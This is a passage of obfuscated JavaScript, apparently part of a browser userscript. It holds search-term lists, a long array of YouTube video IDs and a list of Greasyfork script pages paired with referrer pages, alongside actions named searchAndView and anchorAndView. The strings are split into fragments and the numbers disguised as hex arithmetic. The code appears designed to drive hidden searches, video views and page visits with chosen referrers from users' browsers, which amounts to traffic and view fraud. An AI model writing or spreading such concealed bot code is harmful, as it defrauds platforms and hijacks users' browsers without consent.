'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x92 * -0x2f + -0xe59 + -0x5 * -0x83d)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x2dd * 0x2 + 0x79 * -0x4e + 0xd * 0x266)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x230 + 0xf7e + -0x11ab);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    Z(0x5) + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    a0(0x10) + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    a1(0xc, 'nU84') + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + Z(0x1b) + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + Z(0xb) + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + Z(0x1a) + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + a0(0x4) + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Z(0x17) + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + Z(0x13) + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
